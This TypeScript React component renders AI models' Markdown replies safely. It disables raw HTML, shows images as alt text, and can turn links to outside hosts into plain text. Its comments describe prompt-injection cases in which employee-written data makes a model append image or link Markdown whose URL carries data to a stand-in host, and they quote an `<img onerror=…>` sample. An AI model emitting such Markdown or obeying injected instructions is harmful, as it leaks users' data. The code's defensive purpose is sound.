"use client";

/**
 * Renders the AI surfaces' Markdown.
 *
 * The models return Markdown — headings, **bold**, bullet lists, GFM tables — and every surface was
 * printing it as literal text, so an assistant answer arrived as a wall of `**` and `|` characters
 * with the table structure inlined into a paragraph. Four places had the same bug (the chat, the AI
 * report card, the dashboard narrative, the experimental reports), which is why this is one component
 * rather than a fix repeated four times.
 *
 * **No raw HTML, ever.** `react-markdown` disables it by default and there is no `rehype-raw` here on
 * purpose: this renders model output, and a prompt-injected `<img onerror=…>` should be inert text,
 * not markup. Everything below builds React elements — nothing is `dangerouslySetInnerHTML`.
 *
 * Styling is explicit per element rather than a `prose` class: these blocks live inside chat bubbles
 * and small cards where a typography plugin's default rhythm is far too generous, and the palette has
 * to come from the app's tokens so it follows the theme.
 */

import type { ReactNode } from "react";
import Link from "next/link";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

import { cn } from "@/lib/utils";

/** A stand-in origin that no real URL has, used to tell a rooted path from an absolute URL. */
const SENTINEL_ORIGIN = "https://same-origin.invalid";

/**
 * The in-app path a link points at, or `null` when it leaves the app.
 *
 * Accepted: a rooted path (`/attendance`, `/settings/organization#departments`), or an absolute URL
 * on `origin` (the page's own, when known), which comes back as its path. Everything else is
 * `null`: another host, a protocol-relative `//host`, the `/\host` spelling browsers read as one, a
 * bare relative path (it would resolve against whatever page the chat is open on), `mailto:`, and
 * anything `react-markdown` already emptied (`javascript:`).
 */
export function sameOriginPath(href: string | undefined, origin?: string): string | null {
  const raw = href?.trim();
  if (!raw) return null;
  let url: URL;
  try {
    url = new URL(raw, SENTINEL_ORIGIN);
  } catch {
    return null;
  }
  const rooted = url.origin === SENTINEL_ORIGIN && raw.startsWith("/");
  const ours = !!origin && url.origin === origin;
  if (!rooted && !ours) return null;
  return `${url.pathname}${url.search}${url.hash}`;
}

/** The plain text inside rendered Markdown children — enough to compare a link's label with its URL. */
function textOf(node: ReactNode): string {
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  return "";
}

/**
 * A URL without its scheme or trailing slash, so `www.x.com` and `http://www.x.com/` compare equal
 * (and an autolinked `a@b.com` equals its `mailto:a@b.com`).
 */
const bareUrl = (s: string) =>
  s
    .trim()
    .replace(/^[a-z][a-z0-9+.-]*:\/\//i, "")
    .replace(/^mailto:/i, "")
    .replace(/\/$/, "");

/** An inline-code span that is nothing but a rooted path, e.g. `` `/attendance` ``. */
const PATH_ONLY = /^\/(?!\/)[^\s`]*$/;

/**
 * How links in the text behave.
 *
 * - `"any"` (the default, unchanged for existing surfaces): any `http(s)` link is live, in a new
 *   tab, as before.
 * - `"same-origin"`: only links into the app are live, and they navigate in place. A link to any
 *   other host renders as **plain text with its address shown** — no anchor — and a bare URL is
 *   never turned into one. Model output can be steered by text any employee can write (a window
 *   title, a task name, a leave reason), and "end your answer with [Open the report](https://x/?d=…)"
 *   made every click a way to send the model's words to that host (AI audit 2026-10-22, AI-21).
 */
export type MarkdownLinks = "any" | "same-origin";

/**
 * What a Markdown image becomes: its alt text, **never a fetched `<img>`**.
 *
 * `![x](https://any-host/?d=…)` rendered as a live image is fetched the moment it is shown. In model
 * output that is the zero-click exfiltration channel: tenant data any employee can write (a task
 * title, a leave reason, a window title the agent captured) can carry "append this image to your
 * answer", and the admin's browser then sends whatever the model put in the URL (QA audit 2026-10-08,
 * WP-103). Nothing here needs remote images, so none are loaded. Shared with the task-attachment
 * preview, which renders uploaded `.md` files.
 */
export function MarkdownImage({ alt }: { alt?: string }) {
  return alt ? <span className="text-muted-foreground">[{alt}]</span> : null;
}

export function Markdown({
  children,
  className,
  links = "any",
  isAppPath,
}: {
  children: string;
  className?: string;
  /** See {@link MarkdownLinks}. Pass `"same-origin"` wherever the text is a model's reply. */
  links?: MarkdownLinks;
  /**
   * With `links="same-origin"`: is this rooted path a page of the app? When it is, an inline-code
   * path like `` `/attendance` `` renders as a link to it rather than as code (AI audit AI-59) — the
   * assistant was told to point at the page and its pointer couldn't be followed. Unknown paths
   * (`/v1/…`) stay code.
   */
  isAppPath?: (path: string) => boolean;
}) {
  const sameOrigin = links === "same-origin";
  // Read at render, not module load: this file also renders on the server, where there is no page.
  const origin = typeof window === "undefined" ? undefined : window.location.origin;
  return (
    <div className={cn("space-y-2 text-sm leading-relaxed break-words", className)}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          p: ({ children }) => <p className="[&:not(:first-child)]:mt-2">{children}</p>,

          img: ({ alt }) => <MarkdownImage alt={alt} />,

          strong: ({ children }) => (
            <strong className="font-semibold text-foreground">{children}</strong>
          ),
          em: ({ children }) => <em className="italic">{children}</em>,

          // Headings are flattened to two visual weights: a model asked for a short answer will
          // happily emit `###`, and honouring six levels inside a chat bubble looks broken.
          h1: ({ children }) => (
            <p className="mt-3 text-sm font-semibold text-foreground first:mt-0">{children}</p>
          ),
          h2: ({ children }) => (
            <p className="mt-3 text-sm font-semibold text-foreground first:mt-0">{children}</p>
          ),
          h3: ({ children }) => (
            <p className="mt-2 text-[13px] font-semibold text-foreground first:mt-0">{children}</p>
          ),

          // Markers follow the text colour (`text-current`) rather than a fixed
          // `text-muted-foreground`. That constant was a light-background assumption, and this
          // component renders on the teal feature card in three places — the dashboard AI summary,
          // the Analytics executive summary and the experimental reports — where a muted grey
          // marker all but disappears against the fill. Inheriting means a bullet is legible on
          // every surface, including any card added later.
          ul: ({ children }) => (
            <ul className="ml-4 list-disc space-y-1 marker:text-current">{children}</ul>
          ),
          ol: ({ children }) => (
            <ol className="ml-4 list-decimal space-y-1 marker:text-current">{children}</ol>
          ),
          li: ({ children }) => <li className="pl-0.5">{children}</li>,

          // The visible failure in the bug report: a table arrived as pipes run together into prose.
          // `overflow-x-auto` keeps a wide table scrolling inside its own box instead of stretching
          // the chat panel (a repo convention — wide content scrolls, the page never does).
          table: ({ children }) => (
            <div className="my-2 max-w-full overflow-x-auto rounded-lg border">
              <table className="w-full border-collapse text-left text-[13px]">{children}</table>
            </div>
          ),
          thead: ({ children }) => <thead className="bg-muted/50">{children}</thead>,
          th: ({ children }) => (
            <th className="border-b px-2.5 py-1.5 font-medium whitespace-nowrap">{children}</th>
          ),
          td: ({ children }) => (
            <td className="border-b px-2.5 py-1.5 align-top last:border-b-0">{children}</td>
          ),

          code: ({ className: cls, children }) => {
            // react-markdown marks fenced blocks with a `language-*` class; bare inline code has none.
            const fenced = /language-/.test(cls ?? "");
            // An in-app path the model wrapped in backticks: make it the link it was meant to be.
            if (!fenced && sameOrigin && isAppPath) {
              const text = textOf(children).trim();
              const path = PATH_ONLY.test(text) ? sameOriginPath(text) : null;
              if (path && isAppPath(path)) {
                return (
                  <Link
                    href={path}
                    className="font-medium text-primary underline underline-offset-2"
                  >
                    <code className="rounded bg-muted px-1 py-0.5 font-mono text-[0.85em]">
                      {text}
                    </code>
                  </Link>
                );
              }
            }
            return fenced ? (
              <code className="block overflow-x-auto rounded-lg bg-muted p-2.5 font-mono text-xs">
                {children}
              </code>
            ) : (
              <code className="rounded bg-muted px-1 py-0.5 font-mono text-[0.85em]">
                {children}
              </code>
            );
          },
          pre: ({ children }) => <pre className="my-2">{children}</pre>,

          a: ({ href, children }) => {
            if (sameOrigin) {
              const path = sameOriginPath(href, origin);
              if (path) {
                return (
                  <Link
                    href={path}
                    className="font-medium text-primary underline underline-offset-2"
                  >
                    {children}
                  </Link>
                );
              }
              // Leaves the app: text, with the destination in plain sight, and nothing to click.
              // An autolinked bare URL is its own label, so it is shown once.
              const label = textOf(children);
              const showHref = !!href && label.trim() !== "" && bareUrl(label) !== bareUrl(href);
              return (
                <span data-external-link="">
                  {label.trim() === "" && href ? href : children}
                  {showHref ? (
                    <span className="text-muted-foreground break-all"> ({href})</span>
                  ) : null}
                </span>
              );
            }
            return (
            <a
              href={href}
              target="_blank"
              // `noreferrer` alongside `noopener`: the destination is model-supplied, so it should
              // learn nothing about where the click came from.
              rel="noopener noreferrer"
              className="font-medium text-primary underline underline-offset-2"
            >
              {children}
            </a>
            );
          },

          blockquote: ({ children }) => (
            <blockquote className="border-l-2 pl-3 text-muted-foreground">{children}</blockquote>
          ),
          hr: () => <hr className="my-3" />,
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
